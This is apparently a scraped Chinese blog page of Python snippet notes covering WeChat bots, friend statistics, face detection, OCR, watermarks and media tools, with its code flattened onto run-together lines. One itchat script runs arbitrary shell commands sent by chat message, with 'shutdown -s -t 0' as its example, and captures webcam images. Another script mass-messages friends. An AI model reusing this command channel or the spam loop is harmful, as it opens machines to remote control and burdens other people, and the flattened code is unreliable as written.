new_friend.send('你好，我是群聊机器人，回复"入群"口令进入群聊天哦！')# 接收文字消息的装饰器@base_bot.register(msg_types=TEXT)def add_into_chatroom(msg): # 接收进群口令 if msg.text.lower() == '入群': # use_invitation为True，发送群邀请，False则拉进群聊 group[0].add_members(msg.sender, use_invitation=True) else: # 其他消息 return u'收到：' + msg.textbase_bot.join()for sex, count in friends_stat["sex"].iteritems(): # 1代表MALE, 2代表FEMALE if sex == 1: print "MALE %d" % count elif sex == 2: print "FEMALE %d" % count from wxpy import * bot = Bot(cache_path=True) friends_stat = bot.friends().stats() friend_loc = [] # 每一个元素是一个二元列表，分别存储地区和人数信息 for province, count in friends_stat["province"].iteritems(): if province != "": friend_loc.append([province, count]) # 对人数倒序排序 friend_loc.sort(key=lambda x: x[1], reverse=True) # 打印人数最多的10个地区 for item in friend_loc[:10]: print item[0], item[1] 群发消息12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import time# 初始化一个机器人对象https://yfzhou.coding.me/2018/09/04/%E5%BE%AE%E4%BF%A1%E6%9C%80%E5%BC%BA%E8%8A%B1%E5%BC%8F%E6%93%8D%E4%BD%9C%EF%BC%8C%E5%B8%A6%E4%BD%A0%E7%8E%A9%E8%BD%AC-wxpy/#https://gitee.com/ShaErHu/wxpy_matplotlib_learning# cache_path为登录状态缓存路径，给定值为第一次登录生成的缓存文件路径bot = Bot(cache_path="D:\PycharmProjects\pythonProcedure\com\zyf\weixin\wxpy.pkl")# 群发消息（谨慎使用，哈哈哈）my_friends = bot.friends(update=False)my_friends.pop(0) # 去除列表第一个元素（自己）for i in range(120): # 时间限制2分钟内最多发120次（具体看wxpy官方文档异常处理） friend = my_friends[i] friend.send('Good morning,the early bird catches the worm!(早上好，早起的鸟儿有虫吃！)') time.sleep(2) friend.send('不用回复，生活中一起加油！') # 获取所有好友[返回列表包含Chats对象(你的所有好友，包括自己)]t0 = bot.friends(update=False)# 查看自己好友数(除开自己)print("我的好友数："+str(len(t0)-1))# 获取所有微信群[返回列表包含Groups对象]t1 = bot.groups(update=False)# 查看微信群数(活跃的)print("我的微信群聊数："+str(len(t1)))# 获取所有关注的微信公众号[返回列表包含Chats对象]t2 = bot.mps(update=False)# 查看关注的微信公众号数print("我关注的微信公众号数："+str(len(t2)))# 初始化一个机器人对象# cache_path缓存路径，给定值为第一次登录生成的缓存文件路径bot = Bot(cache_path="D:\PycharmProjects\pythonProcedure\com\zyf\weixin\wxpy.pkl")#获取好友列表(包括自己)my_friends = bot.friends(update=False)'''stats_text 函数：帮助我们简单统计微信好友基本信息简单的统计结果的文本 :param total: 总体数量 :param sex: 性别分布 :param top_provinces: 省份分布 :param top_cities: 城市分布 :return: 统计结果文本'''print(my_friends.stats_text())bot = Bot(cache_path="D:\PycharmProjects\pythonProcedure\com\zyf\weixin\wxpy.pkl")#获取好友列表(包括自己)my_friends = bot.friends(update=False)# 微信昵称nick_name = ''# 微信个性签名wx_signature = ''for friend in my_friends: # 微信昵称：NickName nick_name = nick_name + friend.raw['NickName'] # 个性签名：Signature wx_signature = wx_signature + friend.raw['Signature']nick_name = jiebaclearText(nick_name)wx_signature = jiebaclearText(wx_signature)make_wordcloud(nick_name,1)make_wordcloud(wx_signature,2)# 获取微信公众号名称wx_public_name = ''# 公众号简介wx_pn_signature = ''# 获取微信公众号列表my_wx_pn = bot.mps(update=False)for wx_pn in my_wx_pn: wx_public_name = wx_public_name + wx_pn.raw['NickName'] wx_pn_signature = wx_pn_signature + wx_pn.raw['Signature']wx_public_name = jiebaclearText(wx_public_name)make_wordcloud(wx_public_name,3)wx_pn_signature = jiebaclearText(wx_pn_signature)make_wordcloud(wx_pn_signature,4) 人脸识别1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python# -*- coding: utf-8 -*-# @Time : 2018/11/5 14:21# @Author : yfzhou# @Site : # @File : face_id.py# @Software: PyCharm# Life is short, I use python.# 人脸识别https://yfzhou.coding.me/2018/11/12/OpenCV-Python-%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB/import cv2filename = "C:\\Users\\Administrator\\Pictures\\2018-05-16\\1865.JPG"def detect(filename): # haarcascade_frontalface_default.xml存储在package安装的位置 # haarcascade_frontalface_default 识别人脸 # haarcascade_eye 识别眼睛 face_cascade = cv2.CascadeClassifier( "D:\\Python\\Python37\\Lib\\site-packages\\cv2\\data\\haarcascade_frontalface_default.xml") eye_cascade = cv2.CascadeClassifier("D:\\Python\\Python37\\Lib\\site-packages\\cv2\\data\\haarcascade_eye.xml") img = cv2.imread(filename) gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) # 传递参数是scaleFactor和minNeighbors,分别表示人脸检测过程中每次迭代时图像的压缩率以及每个人脸矩形保留近邻数目的最小值 # 检测结果返回人脸矩形数组 faces = face_cascade.detectMultiScale(gray, 1.1, 5) print(faces) for (x, y, w, h) in faces: # 给最新的检测到的人脸图片外面，标明一个方框 img = cv2.rectangle(img, (x, y), (x + w, y + h), (255, 0, 0), 3) face_re = img[y:y + h, x:x + h] face_re_g = gray[y:y + h, x:x + h] eyes = eye_cascade.detectMultiScale(face_re_g) for (ex, ey, ew, eh) in eyes: cv2.rectangle(face_re, (ex, ey), (ex + ew, ey + eh), (0, 255, 0), 2) # cv2.namedWindow("Human Face Result!") # cv2.imshow("Human Face Result!", img) # 吧识别后的图片保存至指定目录 cv2.imwrite("C:\\Users\\Administrator\\Pictures\\2018-05-16\\Face.jpg", img) # cv2.waitKey(0) # cv2.destroyAllWindows()detect(filename) 图片水印123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from PIL import Imagefrom PIL import Image,ImageDraw,ImageFontimage = Image.open('wechat.png')# 打开等待加水印的图片watermark = Image.open('mp.png')# 打开水印图片factor = 1# 如果觉得水印图片太大，可以缩放，这里缩放比例为50%watermark = watermark.resize( tuple(map(lambda x: int(x * factor), watermark.size)))# 缩放图片layer=Image.new('RGBA',image.size)# 生成一个新的layerlayer.paste(watermark,(image.size[0]-watermark.size[0], image.size[1]-watermark.size[1]))# 把水印打到新的layer上去，后面参数是水印位置，此处是右下角 marked_img=Image.composite(layer,image,layer)# 添加水印# marked_img.show()# 打开生成的图片（缓存图片）marked_img.save('wechat_remark.jpg')# 保存图片#文字水印https://www.qingwei.tech/programe-develops/python/1154.htmlimage = Image.open('lifeistoshort.jpg')# 打开要加水印的图片text=input('输入你的水印文字:\n')# 提示要打水印的文字font=ImageFont.truetype('C:\Windows\Fonts\simhei.ttf',64)# 获得一个字体，你也可以自己下载相应字体，第二个值是字体大小layer=image.convert('RGBA')# 将图片转换为RGBA图片text_overlay=Image.new('RGBA',layer.size)# 依照目标图片大小生成一张新的图片 参数[模式,尺寸,颜色(默认为0)]image_draw=ImageDraw.Draw(text_overlay)# 画图text_size_x,text_size_y=image_draw.textsize(text,font=font)# 获得字体大小,textsize(text, font=None)text_xy=(layer.size[0]-text_size_x,layer.size[1]-text_size_y)# 设置文本位置 此处是右下角显示image_draw.text(text_xy, text, font=font, fill=(0, 0, 0, 85))# 设置文字，位置,字体,颜色和透明度marked_img=Image.alpha_composite(layer,text_overlay)# 将水印打到原图片上生成新的图片marked_img.save('qingwei_after.png')# 保存图片marked_img.show()# 显示图片（这里是生成一个临时文件，必须关闭图片 这段py代码才算结束） Python骚操作：微信远程控制电脑123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960pip install opencv-pythonpip install matplotlib#!/usr/bin/env python# -*- coding: utf-8 -*-# @Time : 2018/8/20 11:12# @Author : yfzhou# @Site : https://yfzhou.coding.me/2018/08/20/Python%E9%AA%9A%E6%93%8D%E4%BD%9C%EF%BC%9A%E5%BE%AE%E4%BF%A1%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%94%B5%E8%84%91/# @File : wechat_control_computer.py# @Software: PyCharm# Life is short, I use python.import itchatimport osimport timeimport cv2sendMsg = u"&#123;消息助手&#125;：暂时无法回复"usageMsg = u"使用方法：\n1.运行CMD命令：cmd xxx (xxx为命令)\n" \ u"-例如关机命令:\ncmd shutdown -s -t 0 \n" \ u"2.获取当前电脑用户：cap\n3.启用消息助手(默认关闭)：ast\n" \ u"4.关闭消息助手：astc"flag = 0 # 消息助手开关nowTime = time.localtime()filename = str(nowTime.tm_mday) + str(nowTime.tm_hour) + str(nowTime.tm_min) + str(nowTime.tm_sec) + ".txt"myfile = open(filename, 'w')@itchat.msg_register('Text')def text_reply(msg): global flag message = msg['Text'] fromName = msg['FromUserName'] toName = msg['ToUserName'] if toName == "filehelper": if message == "cap": cap = cv2.VideoCapture(0) ret, img = cap.read() cv2.imwrite("weixinTemp.jpg", img) itchat.send('@img@%s' % u'weixinTemp.jpg', 'filehelper') cap.release() if message[0:3] == "cmd": os.system(message.strip(message[0:4])) if message == "ast": flag = 1 itchat.send("消息助手已开启", "filehelper") if message == "astc": flag = 0 itchat.send("消息助手已关闭", "filehelper") elif flag == 1: itchat.send(sendMsg, fromName) myfile.write(message) myfile.write("\n") myfile.flush()if __name__ == '__main__': itchat.auto_login() itchat.send(usageMsg, "filehelper") itchat.run() 生成中文词云图123456789101112131415161718192021222324252627282930313233343536373839404142pip install wordcloudpip install jieba# -*- coding: utf-8 -*-# @Time : 2018/9/4 13:52# @Author : yfzhou# @Site : # @File : demo10.py# @Software: PyCharm# Life is short, I use python.# 词云生成工具from wordcloud import WordCloud, ImageColorGeneratorimport matplotlib.pyplot as pltfrom os import pathimport jieba# 获取当前的项目文件加的路径d = path.dirname(__file__)# 读取一个txt文件https://yfzhou.coding.me/2018/09/04/Python-wordcloud-jieba-%E7%94%9F%E6%88%90%E4%B8%AD%E6%96%87%E8%AF%8D%E4%BA%91%E5%9B%BE/text = open(r'C:\Users\Administrator\Desktop\阿里传：这是阿里巴巴的世界美特里斯曼.txt', 'r', encoding='utf-8').read()# 读入背景图片bg_pic = plt.imread(r'C:\Users\Administrator\Pictures\Other\155061877268618276.jpg')wordlist_after_jieba = jieba.cut(text, cut_all=True)wl_space_split = " ".join(wordlist_after_jieba)# 生成词云font = d + r'static/simkai.ttf'wc = WordCloud( mask=bg_pic, background_color='white', font_path=font, scale=1.5, max_words=1500).generate(wl_space_split)image_colors = ImageColorGenerator(bg_pic)# 图片背景bg_color = ImageColorGenerator(bg_pic)# 开始画图plt.imshow(wc.recolor(color_func=bg_color))plt.axis('off')plt.show()# 保存图片wc.to_file(d + r"/image/render_09.png") 朗读网页1234567891011121314151617181920212223pip install readability-lxmlimport requestsfrom readability import Documentpip install goose3response = requests.get('https://hoxis.github.io/run-ansible-without-specifying-the-inventory-but-the-host-directly.html')doc = Document(response.text)print(doc.title())#https://yfzhou.coding.me/2018/09/05/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E7%94%A8-Python-%E6%9D%A5%E6%9C%97%E8%AF%BB%E7%BD%91%E9%A1%B5/&gt;&gt;&gt; from goose3 import Goose&gt;&gt;&gt; from goose3.text import StopWordsChinese&gt;&gt;&gt; url = 'http://news.china.com/socialgd/10000169/20180616/32537640_all.html'&gt;&gt;&gt; g = Goose(&#123;'stopwords_class': StopWordsChinese&#125;)&gt;&gt;&gt; article = g.extract(url=url)&gt;&gt;&gt; print(article.cleaned_text[:150])北京时间6月15日23:00(圣彼得堡当地时间18:00)，2018年世界杯B组一场比赛在圣彼得堡球场展开角逐，伊朗1比0险胜摩洛哥，伊朗前锋阿兹蒙半场结束前错过单刀机会，鲍哈杜兹第95分钟自摆乌龙。这是伊朗20年来首度在世界杯决赛圈取胜。本届世界杯，既相继出现替补便进球，贴补梅开二度以及东道主pip install playsound&gt; from playsound import playsound&gt;&gt;&gt; playsound('/path/to/a/sound/file/you/want/to/play.mp3')#https://github.com/hoxis/to_voice/blob/master/page2voice.py 定时检测无响应进程并重启12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#http://www.xetlab.com/2019/04/21/python%E7%BB%83%E6%89%8B%E8%84%9A%E6%9C%AC-%E5%AE%9A%E6%97%B6%E6%A3%80%E6%B5%8B%E6%97%A0%E5%93%8D%E5%BA%94%E8%BF%9B%E7%A8%8B%E5%B9%B6%E9%87%8D%E5%90%AF/import osimport timeimport scheduledef parse_output(output): print(output) pid_list = [] lines = output.strip().split("\n") if len(lines) &gt; 2: for line in lines[2:]: pid_list.append(line.split()[1]) return pid_listdef list_not_response(process_name): return list_process(process_name, True)def list_process(process_name, not_respond=False): cmd = 'tasklist /FI "IMAGENAME eq %s"' if not_respond: cmd = cmd + ' /FI "STATUS eq Not Responding"' output = os.popen(cmd % process_name) return parse_output(output.read())def start_program(program): os.popen(program)def check_job(): process_name = "xx.exe" not_respond_list = list_not_response(process_name) if len(not_respond_list) &lt;= 0: return pid_params = " ".join(["/PID " + pid for pid in not_respond_list]) os.popen("taskkill /F " + pid_params) if len(list_process(process_name)) &lt;= 0: start_program(r'E:\xxx\xx.exe')if __name__ == '__main__': schedule.every(5).seconds.do(check_job) while True: schedule.run_pending() time.sleep(1) 多线程PDF转Word12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import osfrom configparser import ConfigParserfrom io import StringIOfrom io import openfrom concurrent.futures import ProcessPoolExecutorfrom pdfminer.pdfinterp import PDFResourceManagerfrom pdfminer.pdfinterp import process_pdffrom pdfminer.converter import TextConverterfrom pdfminer.layout import LAParamsfrom docx import Document#https://github.com/python-fan/pdf2word/blob/master/main.pydef read_from_pdf(file_path): with open(file_path, 'rb') as file: resource_manager = PDFResourceManager() return_str = StringIO() lap_params = LAParams() device = TextConverter( resource_manager, return_str, laparams=lap_params) process_pdf(resource_manager, device, file) device.close() content = return_str.getvalue() return_str.close() return contentdef save_text_to_word(content, file_path): doc = Document() for line in content.split('\n'): paragraph = doc.add_paragraph() paragraph.add_run(remove_control_characters(line)) doc.save(file_path)def remove_control_characters(content): mpa = dict.fromkeys(range(32)) return content.translate(mpa)def pdf_to_word(pdf_file_path, word_file_path): content = read_from_pdf(pdf_file_path) save_text_to_word(content, word_file_path)def main(): config_parser = ConfigParser() config_parser.read('config.cfg') config = config_parser['default'] tasks = [] with ProcessPoolExecutor(max_workers=int(config['max_worker'])) as executor: for file in os.listdir(config['pdf_folder']): extension_name = os.path.splitext(file)[1] if extension_name != '.pdf': continue file_name = os.path.splitext(file)[0] pdf_file = config['pdf_folder'] + '/' + file word_file = config['word_folder'] + '/' + file_name + '.docx' print('正在处理: ', file) result = executor.submit(pdf_to_word, pdf_file, word_file) tasks.append(result) while True: exit_flag = True for task in tasks: if not task.done(): exit_flag = False if exit_flag: print('完成') exit(0)if __name__ == '__main__': main() 自动化测试工具selenium1234567891011121314151617181920#http://jeffyang.top/Python/%E7%88%AC%E8%99%AB/Python%E7%88%AC%E8%99%AB%E5%B8%B8%E7%94%A8%E5%BA%93selenium%E8%AF%A6%E8%A7%A3/from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.common.keys import Keysfrom selenium.webdriver.support import expected_conditions as ECfrom selenium.webdriver.support.wait import WebDriverWaitbrowser = webdriver.Chrome()try: browser.get('https://www.baidu.com') input = browser.find_element_by_id('kw') input.send_keys('Python') input.send_keys(Keys.ENTER) wait = WebDriverWait(browser, 10) wait.until(EC.presence_of_element_located((By.ID, 'content_left'))) print(browser.current_url) print(browser.get_cookies()) print(browser.page_source)finally: browser.close() 字符串模糊匹配1234567891011from fuzzywuzzy import processcourts = ['北京市第二中级人民法院','北京市第三中级人民法院','北京市石景山区人民法院']print(process.extractOne('北京第三中院', courts)[0])print(process.extractOne('石景山区法院', courts)[0])输出https://www.dust8.com/2019/04/20/fuzzywuzzy/北京市第三中级人民法院北京市石景山区人民法院 判断图片是否损坏12345678910from PIL import Imagedef is_valid_image(filename): valid = True try: Image.open(filename).load() except OSError: valid = False return valid unicode转中文12str.encode('utf-8').decode('unicode-escape')https://tangx1.com/solved/ 文字识别ocr12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667//默认使用eng文字库， imgName是图片的地址，result识别结果tesseract imgName result指定语言://指定使用简体中文tesseract -l chi_sim imgName result//查看本地存在的语言库tesseract --list-langs指定多语言://指定多语言，用+号相连tesseract -l chi_sim+eng imgName result通过 pip 安装支持Python 版本的 Tesseract库pip install pytesseract通过Python代码的简单实现import pytesseractfrom PIL import Imageimage = Image.open('/Users/admin/Desktop/test.jpg')text = pytesseract.image_to_string(image)print texthttps://zhuanlan.zhihu.com/p/31530755https://sourceforge.net/projects/tesseract-ocr/https://github.com/tesseract-ocr/tesseracthttps://github.com/UB-Mannheim/tesseract/wiki https://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-w64-setup-v4.1.0-bibtag19.exe在windows可以通过exe安装包安装，下载地址可以从GitHub项目中的wiki找到。安装完成后记得将Tesseract 执行文件的目录加入到PATH中，方便后续调用。img = Image.open("vm3.png");text = image_to_string(img,lang='chi_sim')print(text)https://segmentfault.com/a/1190000015489113tesseract 520.png outfileTesseract Open Source OCR Engine v4.1.0-bibtag19 with Leptonicagit clone https://github.com/tesseract-ocr/tessdata 太慢了https://github.com/tesseract-ocr/tessdata/raw/master/chi_sim.traineddata 直接下载这个文件wget -c https://github.com/tesseract-ocr/tessdata/blob/master/chi_sim.traineddata?raw=true下载好的语言包放入到安装目录中的testdata下即可。在windows系统你还需要将testdata目录也加入环境变量。tesseract test.png outfile -l chi_simTesseract Open Source OCR Engine v4.1.0-bibtag19 with Leptonica英文加汉子用-l eng+chi_simhttps://betacat.online/posts/2018-01-16/chinese-text-ocr-via-python/http://qinghua.github.io/tesseract/from PIL import Imageimport pytesseractclass Languages: CHS = 'chi_sim' CHT = 'chi_tra' ENG = 'eng'def img_to_str(image_path, lang=Languages.ENG): return pytesseract.image_to_string(Image.open(image_path), lang) print(img_to_str('image/test1.png', lang=Languages.CHS))print(img_to_str('image/test2.png', lang=Languages.CHS))虽然tesseract不能直接处理PDF，但是借助ImageMagick和Ghostscript可以轻松地把PDF转换成图片文件： brew install imagemagickbrew install ghostscriptconvert -density 100 -trim input.pdf output%04d.jpg在线 https://gongpeione.github.io/quick-js-ocr/example/ pydub音频处理库12345678910111213141516171819202122from pydub import AudioSegmentsong = AudioSegment.from_wav("never_gonna_give_you_up.wav")song = AudioSegment.from_mp3("never_gonna_give_you_up.mp3")ogg_version = AudioSegment.from_ogg("never_gonna_give_you_up.ogg")flv_version = AudioSegment.from_flv("never_gonna_give_you_up.flv")mp4_version = AudioSegment.from_file("never_gonna_give_you_up.mp4", "mp4")wma_version = AudioSegment.from_file("never_gonna_give_you_up.wma", "wma")aac_version = AudioSegment.from_file("never_gonna_give_you_up.aiff", "aac")awesome.export("mashup.mp3", format="mp3")awesome.export("mashup.mp3", format="mp3", tags=&#123;'artist': 'Various artists', 'album': 'Best of 2011', 'comments': 'This album is awesome!'&#125;)awesome.export("mashup.mp3", format="mp3", bitrate="192k")https://xin053.github.io/2016/11/05/pydub%E9%9F%B3%E9%A2%91%E5%A4%84%E7%90%86%E5%BA%93%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/ 将目录下的所有mp4文件和flv文件转换为mp3import osimport globfrom pydub import AudioSegmentvideo_dir = '/home/johndoe/downloaded_videos/' # Path where the videos are locatedextension_list = ('*.mp4', '*.flv')os.chdir(video_dir) # change the workplacefor extension in extension_list: for video in glob.glob(extension): mp3_filename = os.path.splitext(os.path.basename(video))[0] + '.mp3' AudioSegment.from_file(video).export(mp3_filename, format='mp3') dataset简易数据库123456789101112131415161718192021222324252627282930313233343536373839404142434445import datasetdb = dataset.connect('sqlite:///:memory:')db = dataset.connect('mysql://user:password@localhost/mydatabase')table = db['sometable']table.insert(dict(name='John Doe', age=37))table.insert(dict(name='Jane Doe', age=34, gender='female'))john = table.find_one(name='John Doe')OrderedDict([('id', 1), ('name', 'John Doe'), ('age', 37), ('gender', None)])table.update(dict(name='John Doe', age=47), ['name'])第二个参数相当于sql update语句中的where，用来过滤出需要更新的记录with dataset.connect() as tx: tx['user'].insert(dict(name='John Doe', age=46, country='China'))事务操作可以简单的使用上下文管理器来实现,出现异常，将会回滚db = dataset.connect()db.begin()try: db['user'].insert(dict(name='John Doe', age=46, country='China')) db.commit()except: db.rollback()&gt;&gt;&gt; print(db)&lt;Database(sqlite:///mydatabase.db)&gt;&gt;&gt;&gt; print(db.tables)['user']&gt;&gt;&gt; print(db['user'].columns)['id', 'country', 'name', 'age', 'gender']&gt;&gt;&gt; print(len(db['user']))2&gt;&gt;&gt; table = db['user']&gt;&gt;&gt; table&lt;Table(user)&gt;&gt;&gt;&gt; table.tableTable('user', MetaData(bind=Engine(sqlite:///mydatabase.db)), Column('id', INTEGER(), table=&lt;user&gt;, primary_key=True, nullable=False), Column('country', TEXT(), table=&lt;user&gt;), Column('name', TEXT(), table=&lt;user&gt;), Column('age', INTEGER(), table=&lt;user&gt;), Column('gender', TEXT(), table=&lt;user&gt;), schema=None) db['user'].distinct('country') table.delete(place='Berlin')result = db.query('SELECT country, COUNT(*) c FROM user GROUP BY country')for row in result: print(row['country'], row['c']) result = db['users'].all() dataset.freeze(result, format='json', filename='users.json')https://xin053.github.io/2016/11/08/dataset%E7%AE%80%E6%98%93%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8C%85%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/ Tesseract图片文字识别1234567891011121314151617181920212223242526272829303132333435363738brew install tesseracthttps://github.com/tesseract-ocr/tesseract/wikitesseract paper.png paper -l chi_simtesseract paper.png paper -l chi_sim -c language_model_ngram_on=1tesseract paper.png paper -l chi_sim tess.confhttps://tonydeng.github.io/2016/07/28/on-the-use-of-tesseract-picture-text-recognition/ tesseract -hUsage: D:\Tesseract\tesseract.exe --help | --help-extra | --version D:\Tesseract\tesseract.exe --list-langs D:\Tesseract\tesseract.exe imagename outputbase [options...] [configfile...]OCR options: -l LANG[+LANG] Specify language(s) used for OCR.NOTE: These options must occur before any configfile.Single options: --help Show this help message. --help-extra Show extra help for advanced users. --version Show version information. --list-langs List available languages for tesseract engine. tesseract 1.jpg test -l chi_sim-l chi_sim表示用训练的中文数据库识别图片中的文字，不带-l默认使用英文，多个语言之间使用+连接执行上面的命令以后，会在桌面生成一个test.txt文件，文件内容就是识别的文字from PIL import Imageimport pytesseractprint(pytesseract.image_to_string(Image.open(r"C:\Users\zzx\Desktop\1.jpg")))print(pytesseract.image_to_string(Image.open(r"C:\Users\zzx\Desktop\1.jpg"), lang='fra'))f = open(output_file_name)try: return f.read().strip()finally: f.close()https://xin053.github.io/2016/10/28/Tesseract%E5%85%89%E5%AD%A6%E8%AF%86%E5%88%AB/ qrcode二维码生成库1234567891011121314151617pip install qrcodeqr "Some text" &gt; test.pngimport qrcodeimg = qrcode.make('Some data here')img.save(r"C:\Users\zzx\Desktop\test.jpg")import qrcodeqr = qrcode.QRCode( version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=4,)qr.add_data('Some data')qr.make(fit=True)img = qr.make_image()https://xin053.github.io/2016/10/28/qrcode%E4%BA%8C%E7%BB%B4%E7%A0%81%E7%94%9F%E6%88%90%E5%BA%93%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/ FFMpeg合并视频123ffmpeg -i "工程师的痛只有工程师能懂_高清-XNzE1NTk3Mzky_part1.flv" -c copy -bsf:v h264_mp4toannexb -f mpegts 1.tsffmpeg -i "工程师的痛只有工程师能懂_高清-XNzE1NTk3Mzky_part2.flv" -c copy -bsf:v h264_mp4toannexb -f mpegts 2.tsffmpeg -i "concat:1.ts|2.ts" -c copy -bsf:a aac_adtstoasc "工程师的痛只有工程师能懂.mp4" 新闻网页正文通用抽取器1234567891011121314151617# 使用 pip 安装pip install --upgrade git+https://github.com/kingname/GeneralNewsExtractor.git# 使用 pipenv 安装pipenv install git+https://github.com/kingname/GeneralNewsExtractor.git#egg=gne使用 GNE&gt;&gt;&gt; from gne import GeneralNewsExtractor&gt;&gt;&gt; html = '''经过渲染的网页 HTML 代码'''&gt;&gt;&gt; extractor = GeneralNewsExtractor()&gt;&gt;&gt; result = extractor.extract(html, noise_node_list=['//div[@class="comment-list"]'])&gt;&gt;&gt; print(result)&#123;"title": "xxxx", "publish_time": "2019-09-10 11:12:13", "author": "yyy", "content": "zzzz"&#125;在 Chrome 浏览器中打开对应页面，然后开启开发者工具 在Elements标签页定位到&lt;html&gt;标签，并右键，选择Copy-Copy OuterHTML，如下图所示 基于Pyqt5的电影天堂电影搜索工具123456789101112https://github.com/lt94/MovieHeavenspip3 install pyqt5python3 movies.pyhttps://mp.weixin.qq.com/s?__biz=MzA3Nzc4MzY2NA==&amp;mid=2247485581&amp;amp;idx=1&amp;amp;sn=56825bf55a43c727b594d97ccbdbaff5&amp;source=41#wechat_redirectWindows下# only python3 is supportedpip install pyinstaller# -w 不能省略,不然会运行过程中会控制台界面pyinstaller -F -w ./movies.py ./movieSource/MovieHeaven.py ./movieSource/fake_user_agent.py 安装 pyinstaller 失败123456pip install pyinstaller提示失败pip._vendor.urllib3.exceptions.ReadTimeoutError: HTTPSConnectionPool(host='files.pythonhosted.org', port=443): Read timed out.把命令改为 &gt; pip install pyinstaller --timeout 1000增加 timeout 时间，运行成功。 Python学习重点摘记 有趣的Python爬虫和Python数据分析小项目 识别图片中的文字 - Tesseract 和 百度云OCR的对比 python来语音转文字 网易云音乐综合爬虫Python库 两分钟获得数千个有效代理 Python爬虫常用工具selenium phantomjs pyquery 网易云音乐助手 Python库Numpy使用入门 Python爬虫常用库pyquery详解 Python爬虫常用库selenium详解 python实现excel二维表格格式化 python pandas 这些方法解决了数据清洗80%的工作量 从头开始 系统化的 学习如何写Python爬虫 Python脚本。模拟登录知乎， 爬虫，操作excel，微信公众号，远程开机 统计微信朋友圈送出的赞票与得到的赞票人员比例 朋友圈转发截图生成工具 爬取微信朋友圈和自己的动态,采用appiunm进行爬取 爬取微信朋友圈 自动为朋友圈点赞/踩 Python实现微信公众号机器人斗图 python3爬虫相关示例汇总 Python进行数据分析 基础系列随笔汇总 Numpy 的创建 array 含b站视频 微信好友分析 爬虫框架之pyspider 多线程PDF转Word 机器学习入门之路-python篇 python写一个预警机器人支持微信和钉钉 如何自学 Python Python学习第三方库案例总结 淘宝模拟登录,淘宝商品爬虫 Python 实现微信自动回复和群聊助手 Python实现微信机器人斗图 使用Python对微信好友进行数据分析 echarts demo 百度云/百度网盘Python客户端 初识 ItChat Python 一键制作微信好友图片墙 微信找房机器人 Python 微信机器人 猪哥的Python入门教程 基于python的微信机器人 微信机器人方向的探索 微信机器人 开源海报生成器 为人工智能从业者服务 公众号文章下载为PDF iWechat微信机器人实现了wxpy的Docker化 Python骚操作 | 还原已撤回的微信消息 Python Learning Note Day Python-OpenCV基本操作cv2 基于搜狗微信搜索的微信公众号爬虫接口 Zabbix + Python/Bash脚本实现使用企业微信发送监控报警 使用koa2+wechaty打造个人微信小秘书 创建微信机器人 Python开发者 Python 遇上你的微信好友 Xposed Hook微信等APP 微信消息自动回复、撤回消息监控 Python查看微信共同好友 Python知识圈原创文章合集 Python可视化分析「大碗宽面」b站弹幕和网易云音乐评论https://github.com/Brucepk/Kris-noodles 微信朋友圈简单数据分析脚本 python3爬虫相关示例汇总 5000 微信好友头像拼成一张图 爬取东方财富网上市公司的财务报表数据 Python实现获取微信好友信息 Python制作一个实验室海报生成器 Python让你的命令行像坤坤一样会打篮球 如何帮女朋友快速抢票 最全的网络爬虫干货总结 微积分的基本直觉 高数和线代入门教程 Python 告诉你所不知道的春晚 1983 -2018 linux搭建12306刷票平台 PHP、Python、JavaScript 识别二维码和生成二维码解决方案 sorry，为所欲为 gfw 树莓派3的Python Web系统 爬虫的Demo 12306火车票 翻墙 v2ray shadowsocksr shadowsocks-windows gfwlist shadowsocks 人工智能舔狗 google验证码破解 中文分词工具 《动手学深度学习》 12306智能刷票，订票 开源项目代码部署平台 人脸识别 网易云音乐可视化 Python数据可视化：网易云音乐 AI 自动生成动漫头像的网站 中文分词 Python 工具包 下载指定的 抖音（Douyin） 号的视频,抖音爬虫 人工智能自动生成 HTML 代码，可用于生产环境 微信公众号爬虫 验证码识别 PyTorch 进行深度学习开发和研究的朋友快速入门 鉴黄数据集 Python3网络爬虫开发实战 检测是否删除被微信好友删除 python微信头像 Hash 生成器、离线破解工具 Python 12306 的抢票工具 python3入门导学 python模拟登陆一些大型网站 人脸检测方案 python数据之道公众号 Python爬虫登录 Python数据分析 Python之禅挑战 深度学习和 TensorFlow 的有趣应用]]></content>
      <tags>
        <tag>python</tag>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[有用的PHP项目收集]]></title>
    <url>%2F2018%2F12%2F12%2F%E6%9C%89%E7%94%A8%E7%9A%84PHP%E9%A1%B9%E7%9B%AE%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[excel123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128composer require maatwebsite/excelcomposer require box/spoutphp artisan make:command ExcelReader&lt;?phpnamespace App\Console\Commands;use App\Imports\TestImport;use Box\Spout\Common\Type;use Box\Spout\Reader\ReaderFactory;use Illuminate\Console\Command;use Maatwebsite\Excel\Facades\Excel;use PhpOffice\PhpSpreadsheet\Settings;class ExcelReader extends Command&#123; /** * The name and signature of the console command. * * @var string */ protected $signature = 'excel:reader &#123;path&#125; &#123;--drive=laravel-excel&#125;'; /** * The console command description. * * @var string */ protected $description = 'Command description'; /** * 测试文件的行数 